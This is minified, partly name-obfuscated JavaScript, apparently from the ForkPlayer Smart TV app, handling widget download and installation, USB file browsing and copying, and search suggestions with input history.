var c=s.split("?");if(c[0]=="1001"){kjtYpr.inf("Загрузка ("+len+")! "+c[1]+"%",1200,"#eee");c[1]=c[1]/1.2;if(c[1]<10)c[1]=10}else if(c[0]=="1000"){kjtYpr.popUp("_FPIdetUstanovkaVidgeta_...");kjtYpr.inf("_FPUstanovka_ ("+len+")...",1200,"#eee");setTimeout(function(){FilePlugin.Unzip('/mtd_rwcommon/widgets/user/'+name+".zip",'/mtd_rwcommon/widgets/user/'+name+'/');if(FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+"/config.xml")){kjtYpr.inf("_FPVidget_ "+name+" _FPuspeshnoUstanovlen_!",2000,"green");kjtYpr.popUp("<b>_FPViklIvklTVchtobiUv_ "+name+" _FPvSmHubVidgNaidDop_",6000);is_loadpage(0);urlinst='/mtd_rwcommon/widgets/user/'+name+'/index.html';confirmed.create("_FPOpenWidget_ "+name+"?<br> _FPrecomOpenFromSmartHub_","Open app").fun0=function(){document.location=urlinst}}else{is_loadpage(0);kjtYpr.inf("_FPOshibkaUstanovki_ "+name+" !",2000,"orange")}},1000)}}
var urlinst="",siptimer;function savezipfile(url,n){alls="";clearTimeout(siptimer);siptimer=setTimeout(function(){if(alls=="")sefOnEvent(1,"1000?1")},20000);kjtYpr.popUp(url+"...");urlinst="";var FilePlugin=$_('pluginObjectFileSystem');try{var leftspace="<font color='#EEE'>Свободно в ТВ:</font> "+ToSize(FilePlugin.GetTotalSize()-FilePlugin.GetUsedSize())}catch(e){}
Wdg=/\.zip$/i;if(Wdg.exec(url)!=null){if(n==null)var name=url.substr(url.lastIndexOf("/")+1).replace(/.zip/i,"");else name=n;wint_name=name;if(FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')&&!wlistRewrite){clearTimeout(siptimer);is_loadpage(0);kjtYpr.inf("_FPVidget_ "+name+" _FPuzheEstVustanovlennih_!",2000,"red");urlinst='/mtd_rwcommon/widgets/user/'+name+'/index.html';confirmed.create("_FPOpenWidget_ "+name+"?<br> _FPrecomOpenFromSmartHub_","Open app").fun0=function(){document.location=urlinst};return}
if(Player.Sef){Player.SefPlugin.Open("Download","1.000","");Player.SefPlugin.OnEvent='sefOnEvent';var ret=Player.SefPlugin.Execute('StartDownFile',url,'/mtd_rwcommon/widgets/user/'+name+".zip",10,10);if(ret){is_loadpage(1)}else kjtYpr.inf("_FPOshibka_!",2000,"orange")}else kjtYpr.inf("_FPnePodderzhivaetsya_ на вашем ТВ!",2000,"orange");return;xhrz=new XMLHttpRequest();xhrz.onreadystatechange=function(){if(xhrz.readyState==4){data=xhrz.responseText;var s='';zip.createReader(new zip.BlobReader(data),function(reader){reader.getEntries(function(entries){if(entries.length){entries[0].getData(new zip.TextWriter(),function(text){s+=text;kjtYpr.popUp(s);reader.close(function(){})},function(current,total){})}})},function(error){kjtYpr.popUp(error)});return;var fileSystemObj=new FileSystem();fileSystemObj.deleteCommonFile(curWidget.id+'/'+name+".zip");tizen.filesystem.resolve("/mtd_rwcommon/common/"+curWidget.id+"/"+name+".zip",function(dir){documentsDir=dir;documentsDir.write(xhrz.responseText)},function(e){console.log("Error"+e.message)},"w");FilePlugin.Copy("/mtd_rwcommon/common/"+curWidget.id+"/"+name+".zip",'/dtv/usb/sda1/'+name+'.zip');if(FilePlugin.IsExistedPath("/mtd_rwcommon/common/"+curWidget.id+"/"+name+".zip")){kjtYpr.inf(xhrz.responseText.length);FilePlugin.Unzip("/mtd_rwcommon/common/"+curWidget.id+"/"+name+".zip",w_to);if(FilePlugin.IsExistedPath(w_to+'config.xml')){kjtYpr.inf("Виджет "+name+" успешно установлен!",2000,"green");kjtYpr.popUp("Выключите и включите ТВ чтоб увидеть "+name+" в смартхаб!</b><br>Виджет вы найдете в приложениях в смартхабе, или в Дополнительные приложения (Серия F)",6000);is_loadpage(0)}else{kjtYpr.inf(""+name+" _FPOshibka_ установки!",2000,"orange");kjtYpr.lll0Il11OxICbl1ll0Ypr(name+".zip",'<?xml version="1.0" encoding="UTF-8"?>\
<widget xmlns="http://www.samsung.com/"><ThumbIcon>icon/106.png</ThumbIcon>\
					    <BigThumbIcon>icon/115.png</BigThumbIcon>\
					    <ListIcon>icon/85.png</ListIcon>\
					    <BigListIcon>icon/95.png</BigListIcon>\
					    <category itemtype="string"/>\
					    <type itemtype="string">user</type>\
					    <fullwidget itemtype="boolean">y</fullwidget>\
					    <mouse itemtype="boolean">y</mouse>\
					    <ticker itemtype="boolean">n</ticker>\
					    <dcont itemtype="string">y</dcont>\
					    <widgetname itemtype="string">'+name+'-error</widgetname>\
					    <description itemtype="string"/>\
					    <width itemtype="number">1280</width>\
					    <height itemtype="number">720</height>\
					    <deleteJS>reset</deleteJS>\
					    <author itemtype="group">\
					        <name itemtype="string"/>\
					        <email itemtype="string"/>\
					        <link itemtype="string"/>\
					        <organization itemtype="string"/>\
					    </author>\
					</widget>');FilePlugin.Copy("/mtd_rwcommon/common/"+curWidget.id+"/"+name+".zip",'/dtv/usb/sda1/pl/config.xml');FilePlugin.Copy("/mtd_rwcommon/common/"+curWidget.id+"/"+name+".zip",w_to+'config.xml')}}}};console.log(url);xhrz.overrideMimeType('text/plain; charset=x-user-defined');xhrz.open('GET',url,!0);xhrz.send()}}
function ScanUsbPort(c){var StoragePlugin=$_('pluginStorage');var nUSBCount=StoragePlugin.GetUSBListSize();var data={"playlist_name":"","channels":[]};if(nUSBCount>0){for(var i=0;i<nUSBCount;i++){var DeviceId=parseInt(StoragePlugin.GetUSBDeviceID(i));var MountPath=StoragePlugin.GetUSBMountPath(DeviceId,0);var usbPath='/dtv/usb/'+MountPath;text=StoragePlugin.GetUSBVendorName(DeviceId)+"<br>"+StoragePlugin.GetUSBModelName(DeviceId)+"<br>"+MountPath;data.channels.push({"title":StoragePlugin.GetUSBVendorName(DeviceId)+" ("+StoragePlugin.GetUSBModelName(DeviceId)+")","description":text,"playlist_url":"usb://"+usbPath})}}else kjtYpr.inf("_FPNoDevices_ USB",1500,"orange");data.channels.push({"title":"_FPTVmemory_","description":"_FPTVmemory_ ТВ","playlist_url":"usb:///mtd_rwcommon/common"});c.parse(llIl1I1HlMgNII1IO0Ypr(data))}
function usbDelete(usbPath){var FilePlugin=$_('pluginObjectFileSystem');if(FilePlugin.IsExistedPath(usbPath))FilePlugin.Delete(usbPath);else{kjtYpr.inf("_FPOshibka_ удаления! "+usbPath,1800);return}
if(FilePlugin.IsExistedPath(usbPath))kjtYpr.inf("_FPOshibka_!",1800);else kjtYpr.inf("_FPDeleted_! "+usbPath,1800)}
function sefOnEventDown(m,s){var c=s.split("?");if(c[0]!="1000"){rettm="_FPZagruzka_ "+c[1]+"% "+retname+" _FPQueue_: "+retlast+" _FPPressStopToCancel_";statusbar(rettm,"copy")}else statusbar("off")}
var numret=0,ret=null,retname="",retlast="",rettimer,retInterval,rettm="";function pasteFile(from,to,names){ss=from.split("-|-");ssn=names.split("-|-");var retry=!1;for(var i=0;i<ss.length;i++){var x=usbCopy(ss[i],to,ssn[i]);if(x==2){retlast=ss.length;ss.splice(i,1);ssn.splice(i,1);i--}else if(x==1){retlast=ss.length;rettm="_FPZagruzka_ "+ssn[i]+" _FPQueue_: "+(ss.length-1)+" _FPPressStopToCancel_";statusbar(rettm,"copy");ss.splice(i,1);ssn.splice(i,1);i--;if(curPage.lIQ0Il1IlIb1Il1OYpr.replace("usb://","").replace("xml://","")==to){oInset[insetActive].reload()}}else if(x==-1){retry=!0;numret++;retlast=ss.length;from=ss.join("-|-");names=ssn.join("-|-");rettimer=setTimeout('pasteFile("'+from+'","'+to+'","'+names+'")',1300);break}else if(x==0){retry=!0;retlast=ss.length;from=ss.join("-|-");names=ssn.join("-|-");rettimer=setTimeout('pasteFile("'+from+'","'+to+'","'+names+'")',1300);break}}
if(!retry)retInterval=setInterval(function(){Player.SefPlugin.Open("Download","1.000","");if(Player.SefPlugin.Execute('StartDownFile',"http://ya.ru/","/mtd_rwcommon/common/test",1,1)){clearInterval(retInterval);statusbar("off")}else{statusbar(rettm,"copy")}},500)}
function usbCopy(usbPath,to,names){try{if(copyUsbMode==1)return 0;var FilePlugin=$_('pluginObjectFileSystem');if(usbPath.indexOf("http")==0){if(Player.Sef){var name=usbPath.substr(usbPath.lastIndexOf("/")+1);if(name.indexOf("?")>0)name=name.substr(0,name.indexOf("?"));if(names!=null&&names!=""){names=totranslit(names,!1).replace(/[^a-zA-Z0-9.]/g,'_');names+=name.substr(name.lastIndexOf("."));name=names}
if(FilePlugin.IsExistedPath(to+'/'+name)){if(copyUsbMode==0){copyUsbMode=1;confirmed.create("","_FPexistOverwrite_?","_FPOverwriteAll_|_FPSkipAll_");confirmed.fun0=function(){copyUsbMode=2};confirmed.fun1=function(){copyUsbMode=3};return 0}else if(copyUsbMode==3){statusbar("_FPSkipAll_ "+name,2000);return 2}}
Player.SefPlugin.Open("Download","1.000","");Player.SefPlugin.OnEvent='sefOnEventDown';ret=Player.SefPlugin.Execute('StartDownFile',usbPath,to+'/'+name,1,1);if(!ret)return-1;else{kjtYpr.inf("_FPZagruzka_! _FPQueue_: "+retlast+" _FPPressStopToCancel_!",2000);retname=name;return 1}}else kjtYpr.inf("_FPnePodderzhivaetsya_ на вашем ТВ!",2000,"orange")}else{var FilePlugin=$_('pluginObjectFileSystem');FilePlugin.Copy(usbPath,to)}}catch(e){kjtYpr.popUp(e.message)}}
var Playlist=new RegExp("\.(m3u|xml|txt)$","i");var Wdg=new RegExp("\.zip$","i");function getUsbList(usbPath,c){usbPath=usbPath.replace("//","/").replace("//","/");var FilePlugin=$_('pluginObjectFileSystem');try{var leftspace="<font color='#EEE'>Свободно в ТВ:</font> "+ToSize(FilePlugin.GetTotalSize()-FilePlugin.GetUsedSize())}catch(e){}
if(Wdg.exec(usbPath)!=null){var name=usbPath.substr(usbPath.lastIndexOf("/")+1).replace(/.zip/i,"");if(FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')){kjtYpr.inf("_FPVidget_ "+name+" _FPuzheEstVustanovlennih_!",2000,"red")}else{setTimeout(function(){FilePlugin.Unzip(usbPath,'/mtd_rwcommon/widgets/user/'+name+'/');if(FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')){kjtYpr.inf("_FPVidget_ "+name+" _FPuspeshnoUstanovlen_!",2000,"green");kjtYpr.popUp("_FPViklIvklTVchtobiUv_ "+name+" _FPvSmHubVidgNaidDop_",6000);is_loadpage(0)}else{kjtYpr.inf("_FPOshibkaUstanovki_"+name+" !",2000,"orange")}},300)}
return}
var fileSystemObj=new FileSystem();var arrFiles=fileSystemObj.readDir(usbPath);var data={"channels":[]};if(arrFiles){if(arrFiles.length==2){kjtYpr.inf("_FPPustayaPapka_!",1000);data.channels.push(emptyCh)}
for(var i=2;i<arrFiles.length;i++){if(arrFiles[i].isDir){data.channels.push({"title":arrFiles[i].name,"playlist_url":"usb://"+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name})}}
for(var i=2;i<arrFiles.length;i++){if(!arrFiles[i].isDir){if(Playlist.exec(arrFiles[i].name)!=null)
data.channels.push({"title":arrFiles[i].name,"playlist_url":"xml://"+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name+"<br>"+ToSize(arrFiles[i].size)+"<br>"+"xml://"+usbPath+"/"+arrFiles[i].name});else if(Wdg.exec(arrFiles[i].name)!=null)
data.channels.push({"logo_30x30":"none","title":"<font color='#FFC600'>"+arrFiles[i].name+"</font>","playlist_url":"usb://"+usbPath+"/"+arrFiles[i].name,"description":"<span style='color:red;'><font color='#EEE'>Установка виджета:</font> "+arrFiles[i].name+"<br><font color='#EEE'>_FPRazmer_:</font> "+ToSize(arrFiles[i].size)+"<br>"+leftspace+"<br><br>Внимание! Убедитесь что в архиве находится именно виджет для самсунг смарт тв и достаточно свободного места</span>"});else data.channels.push({"title":arrFiles[i].name,"stream_url":""+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name+"<br>"+ToSize(arrFiles[i].size)})}}}else{if(arrFiles.length==2){kjtYpr.inf("_FPPustayaPapka_!",1000);c.parse(llIl1I1HlMgNII1IO0Ypr(emptyCh))}}
c.parse(llIl1I1HlMgNII1IO0Ypr(data))}
function TUsbList(dir,c){var data={"channels":[]};if(dir=="/"){tizen.filesystem.listStorages(function(r){for(var i=0;i<r.length;i++){data.channels.push({"title":r[i].label,"playlist_url":"usb:/"+dir+r[i].label,"description":"usb:/"+dir+r[i].label+"<br>"+r[i].type+"<br>"+r[i].state})}
c.parse(llIl1I1HlMgNII1IO0Ypr(data))},function(err){c.parse(JSON.stringify(err))})}else{if(dir.match(/\.wgt$/)){kjtYpr.popUp("Install package "+dir,1500);var onInstallation={onprogress:function(packageId,percentage){kjtYpr.popUp("On installation("+packageId+") : progress("+percentage+")",1000)},oncomplete:function(packageId){kjtYpr.popUp("Installation("+packageId+") Complete",1000)}}
var onError=function(err){kjtYpr.popUp("Error occurred on installation : "+JSON.stringify(err),1000);c.parse(JSON.stringify(err))}
tizen.filesystem.resolve(dir.substr(1),function(file){kjtYpr.popUp("file URI : "+file.toURI(),1500);try{tizen.package.install(file.toURI(),onInstallation,onError)}catch(e){kjtYpr.popUp("Er: "+e.message,1500);c.parse(llIl1I1HlMgNII1IO0Ypr(e))}},function(err){kjtYpr.popUp("Error occurred on resolve : "+JSON.stringify(err),1500);c.parse(llIl1I1HlMgNII1IO0Ypr(err))},"r");return}
var documentsDir;function onsuccess(files){try{for(var i=0;i<files.length;i++){if(!files[i].isFile){data.channels.push({"title":files[i].name,"playlist_url":"usb:/"+dir+"/"+files[i].name,"description":files[i].name})}}
for(var i=0;i<files.length;i++){console.log("File Name is "+files[i].name);if(files[i].isFile){if(Playlist.exec(files[i].name)!=null)
data.channels.push({"logo_30x30":_img('_ST_xmls.png'),"title":files[i].name,"playlist_url":"xml://"+files[i].fullPath,"description":files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br>"+"xml://"+files[i].fullPath});else if(files[i].name.match(/\.wgt$/))
data.channels.push({"logo_30x30":"","title":"<font color='#FFC600'>"+files[i].name+"</font>","playlist_url":"usb:/"+dir+"/"+files[i].name,"description":"<span style='color:red;'><font color='#EEE'>Установка виджета:</font> "+files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br><br><br>Внимание! Убедитесь что в архиве находится именно виджет для самсунг TIZEN смарт тв и достаточно свободного места</span>"});else if(files[i].name.match(/\.(htm|html)$/))
data.channels.push({"logo_30x30":"","title":"<font color='#FFC600'>"+files[i].name+"</font>","playlist_url":"html://"+files[i].fullPath,"description":"<span style='color:red;'><font color='#EEE'>Открыть html страницу:</font> "+files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br><br><br>Внимание! ForkPlayer будет закрыт!</span>"});else{data.channels.push({"title":files[i].name,"stream_url":files[i].fullPath,"description":files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br>"});if(is_img(files[i].fullPath)){data.channels[data.channels.length-1].logo_30x30=files[i].fullPath;data.channels[data.channels.length-1].description='<div id="poster" style="float:left;padding:4px;background-color:#EEEEEE;margin:0px 13px 1px 0px;"><img src="'+files[i].fullPath+'" style="width:180px;float:left;"></div>'+data.channels[data.channels.length-1].description}}}}
c.parse(llIl1I1HlMgNII1IO0Ypr(data))}catch(e){kjtYpr.popUp("ONS="+e.message,2000);c.parse()}}
function onerror(error){console.log("The error "+error.message+" occurred when listing the files in the selected folder");is_loadpage(-1);c.parse()}
tizen.filesystem.resolve(dir.substr(1),function(dir2){documentsDir=dir2;dir2.listFiles(onsuccess,onerror)},function(e){is_loadpage(-1);console.log("Error"+e.message);kjtYpr.popUp(e.message,2000);c.parse()},"r")}}
function ToSize(b){var a=(b>=1073741824)?(b/1073741824)["toFixed"](2)+" ГБ":(b>=1048576)?(b/1048576)["toFixed"](2)+" МБ":(b>=1024)?(b/1024)["toFixed"](2)+" КБ":(b>=0)?b+" Байт":(b<0)?(2+b/1073741824)["toFixed"](2)+" ГБ":"";return a}
function parse_urlk(uk){try{var parse_ur=/^(?:([A-Za-z]+):)?(\/{0,3})([0-9.\-A-Za-z]+)(?::(\d+))?(?:\/([^?#]*))?(?:\?([^#]*))?(?:#(.*))?$/;var result=parse_ur.exec(uk);return result}catch(e){return uk}}
function in_array(needle,haystack,strict){var found=!1,key,strict=!!strict;for(key in haystack){if((strict&&haystack[key]===needle)||(!strict&&haystack[key]==needle)){found=!0;break}}
return found}
function parseHtmlEnteties(str){return str.replace(/&#([0-9]{1,4});/gi,function(match,numStr){var num=parseInt(numStr,10);return String.fromCharCode(num)})}
function ip2long(ip){if(ip==null)ip="";var components;if(components=ip.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)){var iplong=0;var power=1;for(var i=4;i>=1;i-=1){iplong+=power*parseInt(components[i]);power*=256}
return iplong}else return 0};function fixEvent(e){e=e||window.event;if(e.pageX==null&&e.clientX!=null){var html=document.documentElement
var body=document.body
e.pageX=e.clientX+(html&&html.scrollLeft||body&&body.scrollLeft||0)-(html.clientLeft||0)
e.pageY=e.clientY+(html&&html.scrollTop||body&&body.scrollTop||0)-(html.clientTop||0)}
if(!e.which&&e.button){e.which=e.button&1?1:(e.button&2?3:(e.button&4?2:0))}
return e}
function getPosition(e){var left=0
var top=0
while(e.offsetParent){left+=e.offsetLeft
top+=e.offsetTop
e=e.offsetParent}
left+=e.offsetLeft
top+=e.offsetTop
return{x:left,y:top}}
var xhr4,fastremote_timer;function fmod(x,y){var tmp;var tmp2;var p=0;var pY=0;var l=0.0;var l2=0.0;tmp=x.toExponential().match(/^.\.?(.*)e(.+)$/);p=parseInt(tmp[2],10)-(tmp[1]+'').length;tmp=y.toExponential().match(/^.\.?(.*)e(.+)$/);pY=parseInt(tmp[2],10)-(tmp[1]+'').length;if(pY>p){p=pY}
tmp2=(x%y);if(p<-100||p>20){l=Math.round(Math.log(tmp2)/Math.log(10));l2=Math.pow(10,l);return(tmp2/l2).toFixed(l-p)*l2}else{return parseFloat(tmp2.toFixed(-p))}}
var l1IOI0lu11lO1IYpr_param="";function sU(u,d){if(u=="")return d;if(d=="")return u;ur=u.split("#POST");dr=d.split("#POST");if(ur[0].indexOf("?")==-1)ur[0]+="?";else ur[0]+="&";ur[0]+=dr[0];if(ur.length>1||dr.length>1){ur[0]+="#POST"+gV(ur[1]);if(gV(ur[1])!=""&&gV(dr[1])!="")ur[0]+="&";ur[0]+=gV(dr[1])}
return ur[0]}
function lOI11IaRlnp1OIOllYpr(url){console.log("lOI11IaRlnp1OIOllYpr0 "+url);if(url.indexOf("AddFavorite(")==0){var m=url.match(/AddFavorite\((.*?)\)/)[1];if(m=="")url=gP().lIQ0Il1IlIb1Il1OYpr;else url=m.split(",")[2]}
console.log("lOI11IaRlnp1OIOllYpr "+url);if((kjtYpr.l1O0l1gmmv01O11Ypr("glstart")+kjtYpr.l1O0l1gmmv01O11Ypr("zakladki.xml")+kjtYpr.l1O0l1gmmv01O11Ypr("zakladkiSerials.xml")+kjtYpr.l1O0l1gmmv01O11Ypr("zakladkiFilms.xml")+kjtYpr.l1O0l1gmmv01O11Ypr("zakladkiIPTV.xml")+kjtYpr.l1O0l1gmmv01O11Ypr("bookmarks")).indexOf(url)>=0)
return 1;return 0}
function l01llO0sYbDOI1OIYpr(url){if(url.indexOf("AddSearch(")==0){var m=url.match(/AddSearch\((.*?)\)/);if(m!=null){url=m[1].split(",")[2]}}
console.log("l01llO0sYbDOI1OIYpr "+url);var se=getVars("start").search;for(var i in se.sites){if(url==se.sites[i].url)return i}
return-1}
function lO1ll1n1_olOlOYpr(pq){try{k=0;for(var i in pq.json_url){if(gV(pq.json_url[i],"audio")=="")pq.json_url[i].audio="1";if(gV(pq.json_url[i],"title")=="")pq.json_url[i].title=i;if(parseInt(i)>k&&i<(sQual[kjtYpr.GL.quality]+40))if(pq.json_url[i].audio=="1")k=i}
if(k==0){k=10000;for(var i in pq.json_url){if(parseInt(i)<k&&i>sQual[kjtYpr.GL.quality]-40)if(pq.json_url[i].audio=="1")k=i}}
if(pq.mini)play_mini(pq.json_url[k].url);else{pq.url=pq.json_url[k].url;ll0lIOsIoIIlOlYpr(pq)}}catch(e){console.log(e);l1llOQI10lW1l_II101Ypr();kjtYpr.inf("Err play "+e.message,1500);is_loadpage(-1)}}
function saveQuickEnteres(s,ch,inputid){if(Ill1110("is_private"))return;console.log("saveQuickEnteres "+s+"/"+inputid);console.log(ch);if(inputid!="unlockpass"&&s!=""&&ch.type!="password"&&!ch.title.match(/(пароль|password)/i)){if(s.match(/^http/))var type="url";else if(ch.title.match(/(ошук|arch|оиск|poisk)/i))type="web";else if(gV(inputid)!="")type=gV(inputid);else type="";var tmp=null;for(var i in enteresObj){if(enteresObj[i].n==s){tmp=enteresObj.splice(i,1)[0];tmp.s=md5(ch.search_on+gV(inputid)).substr(0,10);enteresObj.unshift(tmp);break}}
if(tmp==null){tmp={"n":s,"s":md5(ch.search_on+gV(inputid)).substr(0,10)};if(type!="")tmp.t=type;enteresObj.unshift(tmp)}
if(enteresObj.length>300)enteresObj.splice(300,1)
kjtYpr.lll0Il11OxICbl1ll0Ypr("enteres",llIl1I1HlMgNII1IO0Ypr(enteresObj))}}
function arLast(str){s=[];for(var i in enteresObj){if(enteresObj[i].n.indexOf(str)==0){s.push({"q":enteresObj[i].n,"img":"_ST_history.png","id":i,"source":"История"})}
if(str==""&&s.length>10&&gV(curPage.curCh,"presearch").match(/^http/))break}
if(str!=""&&gV(ch,"presearch").match(/^http/)){for(var i in l1OII11MlI01IYpr){if(l1OII11MlI01IYpr[i].title.indexOf(str)==0){s.push({"q":l1OII11MlI01IYpr[i].title,"xml_url":l1OII11MlI01IYpr[i].xml_url,"img":l1OII11MlI01IYpr[i].icon,"source":"История"})}}}
return s}
function getDefaultSE(){var se=getVars("getconfig").search.sites;var d={},ds=-1,max=-1,titles=[];for(var i=0;i<se.length;i++){if(se[i].dop){titles.push(se[i].title)}
if(se[i].dop>max){max=se[i].dop;ds=i}}
if(ds>=0&&typeof se[ds]!="undefined")d=se[ds];d.allse=titles;return d}
var hS={},ico_edit='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAYAAADgKtSgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAAhklEQVRIS+3UYQqAIAwFYG/XEbr/RVo+auJyMqdZBD14aTI/+lUgomk9HhPyGRyIgGo4D9Z6TX6W9hq+nWtrcJmLJEzDxYuRfBZ7CQ3g17niXi9uwkgP3gQjXrwZRkZwbU5CHThXi4ScuJUfV/MuvsR6f14cE0fWWBx6WnxQDb8lz+BzSmEH2u1KYK1g5m8AAAAASUVORK5CYII=';function showPresearch(str,ch,reqid){kjtYpr.PresearChSelected=-1;var list=arLast(str,ch);if(gV(ch,"presearch").match(/^http/)){var u=sU(ch.presearch,"client=3&presearch="+str);if(str=="")var sso="Топ запросов";else sso="";var hico=30;if(curCh("playlist_url")=="searchEngines"){if($_("icoedit")==null)lI1I1IxFCIh1l01llYpr("icosearch",'<img id="icoedit" align="left" style="    margin: 1px 3px;width:'+hico+'px;height:'+hico+'px;" onerror="onImgError(this,\'ico_edit\');" src="'+_img(getDefaultSE()["logo"])+'" >');if(str!=""){var xd=getDefaultSE();if(str.match(/^(http|vk:|www\.|html:\/\/)/)){list.unshift({"q":str,"type":"se","img":_img("_ST_urls.png"),"source":' - Открыть ссылку'});lI1I1IxFCIh1l01llYpr("icosearch",'<img align="left" style="width:42px;height:36px;position:absolute;" src="'+_img("_ST_urls.png")+'" >')}else list.unshift({"q":str,"type":"se","img":_img(xd.logo),"source":' - '+"Поиск в "+xd.title})}}else if($_("icoedit")==null)lI1I1IxFCIh1l01llYpr("icosearch",'<img id="icoedit" align="left" onerror="this.src=\''+ico_edit+'\';" style="width:'+hico+'px;height:'+hico+'px;position:absolute;" src="'+gV(curPage.curCh,"logo_30x30")+'" >');if(gV(hS,u)!=""){for(var i in hS[u]){if(typeof hS[u][i]=="object")list.push({"q":hS[u][i][0],"type":hS[u][i][1],"img":hS[u][i][3],"source":sso});else if(typeof hS[u][i]=="string")list.push({"q":hS[u][i],"source":sso})}
if(curCh("playlist_url")=="searchEngines"&&list.length>2&&kjtYpr.inputId=="editurl"&&str!="")list.push({"q":"...","type":"link","xml_url":"http://spiderxml.com/search/?onlyxml=1&from=obox&search="+encodeURIComponent(str),"img":"http://spiderxml.com/spidericon.png","source":' - еще варианты'});printQuick(list,reqid)}else{uHelper.create("directnoheader").getI(u).parse=function(s){if(gV(s)!=""){data=l0QO11lOz0bfh10l0Ypr(s);if(data!=null){hS[u]=data;for(var i in data){if(typeof data[i]=="object")list.push({"q":data[i][0],"type":data[i][1],"img":data[i][3],"source":sso});else if(typeof data[i]=="string")list.push({"q":data[i],"source":sso})}
if(curCh("playlist_url")=="searchEngines"&&list.length>2&&kjtYpr.inputId=="editurl"&&str!="")list.push({"q":"...","type":"link","xml_url":"http://spiderxml.com/search/?onlyxml=1&from=obox&search="+encodeURIComponent(str),"img":"http://spiderxml.com/spidericon.png","source":' - еще варианты'});printQuick(list,reqid)}}}
clearTimeout(xml_livetimer);printQuick(list,reqid,!0)}}else{printQuick(list,reqid)}}
function clearQuick(){if($_(VK.id).value!=""&&kjtYpr.PresearChSelected==-1){$_(VK.id).value=""}else if(kjtYpr.PresearChSelected==-1){delQuick("page")}else{delQuick(gV(kjtYpr.lll110DUxOQIl1Ypr[kjtYpr.PresearChSelected],"id"))}
lI0I0QIO10llQlQI1Ypr($_(VK.id).value)}
function delQuick(id){if(id=="page"){var nx=0;for(var i in kjtYpr.lll110DUxOQIl1Ypr){if(gV(kjtYpr.lll110DUxOQIl1Ypr[i],"id")!=""){enteresObj.splice(kjtYpr.lll110DUxOQIl1Ypr[i].id-nx,1);nx++}}
kjtYpr.inf("Удалено "+nx+" значений с истории вводов",1500)}else if(id!=""){enteresObj.splice(id,1);kjtYpr.inf("Удалено 1 элемент с истории вводов",1500)}else kjtYpr.inf("Удалить можно только значение с вашей истории вводов!",1500);kjtYpr.lll0Il11OxICbl1ll0Ypr("enteres",llIl1I1HlMgNII1IO0Ypr(enteresObj))}
function printQuick(list,reqid,m){if(reqid!=kjtYpr.SUBREQUEST_ID)return;kjtYpr.lll110DUxOQIl1Ypr=[];lI1I1IxFCIh1l01llYpr("MenuCh","");var l1II1IlOORHvj11O1Ypr="",ex=";",dop="";for(var i in list){if(kjtYpr.lll110DUxOQIl1Ypr.length>12&&gV(list[i],"type")!="link")continue;list[i].q=list[i].q.replace(/<.*?>/g,"");if(ex.indexOf(";"+list[i].q+gV(list[i],"type")+";")==-1){ex+=list[i].q+gV(list[i],"type")+";";l1II1IlOORHvj11O1Ypr+="<div id='l1II1IlOORHvj11O1Ypr"+kjtYpr.lll110DUxOQIl1Ypr.length+"' style='width: 100%;height:7.6%;white-space: nowrap;overflow:hidden;font-size:85%;' onclick=\"VK.enter('Enter');\" onmousemove=\"kjtYpr.PresearChSelected="+kjtYpr.lll110DUxOQIl1Ypr.length+";kjtYpr.l1O10l10HkBwOllII0Ypr();\" onclick=\"VK.enter('Enter');\">";if(gV(list[i],"img")!="")l1II1IlOORHvj11O1Ypr+='<img src="'+_img(list[i].img)+'" style="float:left;width:'+css_wh(25)+'px;height:'+css_wh(18)+'px;padding-top:'+css_wh(2)+'px;padding-right:'+css_w(3)+'px;">';var dop="";if(gV(list[i],"source")!=""){l1II1IlOORHvj11O1Ypr+="<div style='float:right;color:gray;overflow:hidden;   font-size: 90%;    margin-top: 0px;'>"+gV(list[i],"source")+"</div>"}
if(i==0)var mq=0;else mq=-4;l1II1IlOORHvj11O1Ypr+="<div style='font-size:80%;width: auto;overflow:hidden;margin-top: "+css_w(0)+"px;padding:0px "+css_w(3)+"px;'>"+list[i].q;l1II1IlOORHvj11O1Ypr+=dop;l1II1IlOORHvj11O1Ypr+="</div></div>";kjtYpr.lll110DUxOQIl1Ypr.push(list[i])}}
if(m&&kjtYpr.lll110DUxOQIl1Ypr.length<12)l1II1IlOORHvj11O1Ypr+="<div style=''><center><img src='"+_img("_ST_b_loading.gif")+"' width="+css_w(25)+" /></center></div>";else statusbar("off");lI1I1IxFCIh1l01llYpr("presearch","<div onmouseout=\"kjtYpr.PresearChSelected=-1;kjtYpr.l1O10l10HkBwOllII0Ypr();\" id='PreSearch' style='background-color:#323c42;border:2px solid transparent;padding:0px 3px;overflow:hidden;'>"+l1II1IlOORHvj11O1Ypr+"</div>");kjtYpr.l1O10l10HkBwOllII0Ypr()}
function is_ifr(ch){if(Ill1110()==null){confirmed.create("Не ждать загрузку данных и открыть стартовую вкладку? Ранее открытые вкладки будут закрыты, настройки будут перезаписаны если их изменить.").fun0=function(){if($_("startlogo")!=null)$_("startlogo").style.display="none";$_("main").style.color=f_cols[kjtYpr.GL.color];oInset.push(OeInit(Inset));renderInset();insetCount=oInset.length;gotoStart()}}else return Ill1110().is_ifr(ch)}
function getNavU(u){if(gV(u)=="")return"";else if(u.indexOf("curl ")==0){var m=parseCURL(u);u=m.url}
if(u.indexOf("#POST")>0)u=u.split("#POST")[0];if(u.match(/^searchEngines(#url|xml)?\|/))u=u.split("|")[2];return u}
